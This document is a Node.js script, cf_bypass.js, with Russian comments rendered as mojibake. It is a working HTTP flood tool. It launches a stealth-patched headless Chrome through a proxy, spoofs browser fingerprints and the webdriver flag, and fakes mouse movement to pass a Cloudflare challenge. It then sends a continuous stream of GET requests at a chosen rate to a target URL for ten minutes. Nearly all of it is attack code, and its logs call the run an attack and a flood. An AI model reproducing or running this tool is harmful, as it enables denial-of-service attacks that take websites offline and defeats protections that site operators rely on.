const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const fs = require('fs');
const { Worker } = require('worker_threads');

// –ì–ª—É–±–æ–∫–∏–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ stealth
puppeteer.use(StealthPlugin());
puppeteer.use(require('puppeteer-extra-plugin-anonymize-ua')());

const CHROME_ARGS = [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-accelerated-2d-canvas',
    '--disable-gpu',
    '--lang=en-US,en',
    '--window-size=1920,1080'
];

async function attackTarget(targetUrl, proxy, rate) {
    console.log(`[‚öô] –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∞—Ç–∞–∫–∏ –Ω–∞ ${targetUrl}`);
    
    const browser = await puppeteer.launch({
        headless: 'new',
        args: [...CHROME_ARGS, `--proxy-server=${proxy}`],
        ignoreHTTPSErrors: true,
        executablePath: '/usr/bin/google-chrome'
    });

    try {
        const page = await browser.newPage();
        
        // –î–µ—Ç–∞–ª—å–Ω–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ —Ñ–∏–Ω–≥–µ—Ä–ø—Ä–∏–Ω—Ç–∞
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Ch-Ua': '"Chromium";v="118", "Google Chrome";v="118"'
        });

        // –≠–º—É–ª—è—Ü–∏—è —á–µ–ª–æ–≤–µ—á–µ—Å–∫–æ–≥–æ –ø–æ–≤–µ–¥–µ–Ω–∏—è
        await page.setViewport({ width: 1920, height: 1080, deviceScaleFactor: 1 });
        await page.evaluateOnNewDocument(() => {
            delete navigator.__proto__.webdriver;
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
        });

        console.log(`[üåê] –ü–µ—Ä–µ—Ö–æ–¥ –Ω–∞ —Ü–µ–ª–µ–≤–æ–π URL...`);
        await page.goto(targetUrl, {
            waitUntil: 'domcontentloaded',
            timeout: 60000
        });

        // –†–∞—Å—à–∏—Ä–µ–Ω–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ Cloudflare
        await handleCloudflare(page);
        
        console.log(`[‚úÖ] –£—Å–ø–µ—à–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ. –ó–∞–ø—É—Å–∫ —Ñ–ª—É–¥–∞...`);
        startRequestsFlood(targetUrl, proxy, rate);

    } catch (error) {
        console.error(`[üí•] –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: ${error.message}`);
        await browser.close();
    }
}

async function handleCloudflare(page) {
    try {
        const title = await page.title();
        if (!title.includes('Just a moment')) return;

        console.log('[üõ°] –û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ –∑–∞—â–∏—Ç–∞ Cloudflare');
        
        // –†–∞—Å—à–∏—Ä–µ–Ω–Ω–∞—è —ç–º—É–ª—è—Ü–∏—è —á–µ–ª–æ–≤–µ—á–µ—Å–∫–æ–≥–æ –ø–æ–≤–µ–¥–µ–Ω–∏—è
        await page.mouse.move(100, 100);
        await page.waitForTimeout(1500);
        await page.mouse.move(200, 200);
        await page.waitForTimeout(1000);
        
        // –†–µ—à–µ–Ω–∏–µ JavaScript Challenge
        await page.waitForFunction(() => {
            const el = document.querySelector('#challenge-form');
            return el && el.offsetParent !== null;
        }, { timeout: 15000 });
        
        await page.click('#challenge-form input[type="submit"]');
        await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 20000 });
        
        console.log('[‚úÖ] –ó–∞—â–∏—Ç–∞ —É—Å–ø–µ—à–Ω–æ –ø—Ä–æ–π–¥–µ–Ω–∞');
    } catch (error) {
        console.error('[‚ùå] –ù–µ —É–¥–∞–ª–æ—Å—å –æ–±–æ–π—Ç–∏ –∑–∞—â–∏—Ç—É:', error.message);
        throw error;
    }
}

function startRequestsFlood(targetUrl, proxy, rate) {
    const [proxyHost, proxyPort] = proxy.split(':');
    let requestCount = 0;

    console.log(`[üî•] –ó–∞–ø—É—Å–∫ —Ñ–ª—É–¥–∞ —Å –∏–Ω—Ç–µ–Ω—Å–∏–≤–Ω–æ—Å—Ç—å—é ${rate} –∑–∞–ø—Ä/—Å–µ–∫`);
    
    const interval = setInterval(async () => {
        try {
            await axios.get(targetUrl, {
                proxy: {
                    host: proxyHost,
                    port: parseInt(proxyPort)
                },
                timeout: 5000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                }
            });
            process.stdout.write('.');
            requestCount++;
        } catch (error) {
            process.stdout.write('x');
        }
    }, 1000 / rate);

    // –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –∫–∞–∂–¥—ã–µ 10 —Å–µ–∫—É–Ω–¥
    setInterval(() => {
        console.log(`\n[üìä] –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –∑–∞–ø—Ä–æ—Å–æ–≤: ${requestCount}`);
    }, 10000);

    // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ —á–µ—Ä–µ–∑ 10 –º–∏–Ω—É—Ç
    setTimeout(() => {
        clearInterval(interval);
        console.log('\n[‚è±] –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞ –ø–æ —Ç–∞–π–º–∞—É—Ç—É');
        process.exit(0);
    }, 600000);
}

// –ó–∞–ø—É—Å–∫
if (process.argv.length < 5) {
    console.log('–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: node cf_bypass.js <URL> <proxy:port> <rate>');
    process.exit(1);
}

attackTarget(
    process.argv[2], 
    process.argv[3], 
    parseInt(process.argv[4])
).catch(console.error);
